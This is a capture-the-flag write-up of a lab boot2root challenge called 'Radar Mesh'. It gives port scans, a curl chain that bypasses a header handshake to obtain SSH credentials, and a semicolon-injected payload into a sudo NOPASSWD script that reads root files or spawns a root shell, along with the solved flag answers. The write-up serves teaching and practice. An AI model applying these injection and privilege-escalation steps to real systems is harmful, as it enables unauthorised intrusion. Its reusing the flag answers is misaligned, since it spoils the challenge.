<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Radar+Mesh" alt="Typing SVG" /></a>

</div>

# Radar Mesh — PWN · JID-Pwn402 · Level 6 · 🟣 INSANE

- **Status:** ✅ SOLVED (4/4) — header-handshake foothold → SSH → sudo command injection, full chain.
- **Points:** 3344 / 3344 (227 + 562 + 855 + 1700)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 `CTF{...}`)
- **Target:** `10.10.10.42` (lab, over VPN)
- **Prompt:** *boot2root — custom "Radar mesh" Python app on `:8094`*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2022,8094` | ✅ |
| 2 | Low privilege user | `spotter` | ✅ |
| 3 | User flag | `CTF{0748b158d2b050ce4d208217036fd295}` | ✅ |
| 4 | Root flag | `CTF{26cca4709a4f686effe39440f9ae7b08}` | ✅ |

---

## Summary

A four-stage boot2root. A custom Python `BaseHTTPServer` app ("Radar mesh") on
port 8094 gates the SSH credentials behind a three-step header handshake
(`X-Node` 1→2→3). After SSH as the low-privilege user, privilege escalation is a
command injection in a `sudo NOPASSWD` bash script that `bash -c`'s lines from a
file the user owns.

## Flag 1 — Open TCP ports (227 pts)

Only an IP was given. Full TCP port sweep:

```bash
sudo nmap -sS -p- --min-rate 5000 -T4 --max-retries 2 -Pn -n -oN nmap-42-full.txt 10.10.10.42
```

Two ports open:

```
2022/tcp open
8094/tcp open
```

Service/version scan:

```bash
nmap -sC -sV -p 2022,8094 10.10.10.42 -oN nmap-42-svc.txt
```

- `2022/tcp` → OpenSSH 9.2p1 Debian (SSH on a non-standard port)
- `8094/tcp` → `BaseHTTP/0.6 Python/3.11.2`, title "Radar mesh"

**Flag 1:** `2022,8094`

## Flag 2 — Low privilege user (562 pts)

Port 8094 serves an app describing a mesh of "nodes" selected by an `X-Node`
request header:

- **Node 1** (the landing page) issues a `nonce` (`mesh-nonce-17`).
- **Node 2** requires header `X-Proof = md5(nonce + "mesh")` and returns a token.
- **Node 3** requires header `X-Token = <token>` and returns the real SSH login.
- Node 9 is a decoy.

Walk the chain:

```bash
# Node 2: fetch nonce, compute proof, get the token
N=$(curl -s http://10.10.10.42:8094/ | grep -oP 'nonce=\K\S+')
P=$(printf '%smesh' "$N" | md5sum | cut -d' ' -f1)
curl -s http://10.10.10.42:8094/ -H "X-Node: 2" -H "X-Proof: $P"
# -> token=node3-ok

# Node 3: trade the token for the SSH login
curl -s http://10.10.10.42:8094/ -H "X-Node: 3" -H "X-Token: node3-ok"
# -> ssh spotter / azimuth-8
```

`md5("mesh-nonce-17mesh") = 33e90544a2daa31d46412fae6766d3d0`.

The low-privilege user is **`spotter`** (password `azimuth-8`).

**Flag 2:** `spotter`

## Flag 3 — User flag (855 pts)

Log in over the alternate SSH port and read the file named by the challenge
(`/home/user.txt`, not the user's home):

```bash
ssh -p 2022 spotter@10.10.10.42   # password: azimuth-8
cat /home/user.txt
```

**Flag 3:** `CTF{0748b158d2b050ce4d208217036fd295}`

## Flag 4 — Root flag (1700 pts)

Enumeration shows a password-less sudo entry:

```
$ sudo -l
(root) NOPASSWD: /opt/mesh/align
```

`/opt/mesh/align` is a root-owned bash script that reads a file **owned by
`spotter`** and runs each matching line through `bash -c` as root:

```bash
#!/bin/bash
while IFS= read -r line; do
  if [[ "$line" == EXEC* && "$line" == *civil* ]]; then
    bash -c "$line"          # runs as root; input file is attacker-controlled
  fi
done < /home/spotter/bearings.txt
```

The guard only checks that a line starts with `EXEC` and contains `civil`. A
`;` turns the rest of the line into a second command executed as root. Write a
clean payload and invoke it with sudo:

```bash
printf 'EXEC civil; cat /root/root.txt\n' > ~/bearings.txt && sudo /opt/mesh/align
```

`EXEC civil` fails harmlessly ("command not found"); `cat /root/root.txt` runs
as root. For a full root shell instead: `printf 'EXEC civil; bash -p\n' > ~/bearings.txt && sudo /opt/mesh/align`.

**Flag 4:** `CTF{26cca4709a4f686effe39440f9ae7b08}`

## Takeaways

- Non-standard SSH port (2022) + custom Python HTTP service on a high port.
- Auth gate was a stateless header chain; the "proof" was just `md5(nonce+"mesh")`.
- Root was a textbook `sudo NOPASSWD` script that `bash -c`'s attacker-controlled
  input — the weak `EXEC*`/`*civil*` string guard is bypassed with a `;`.
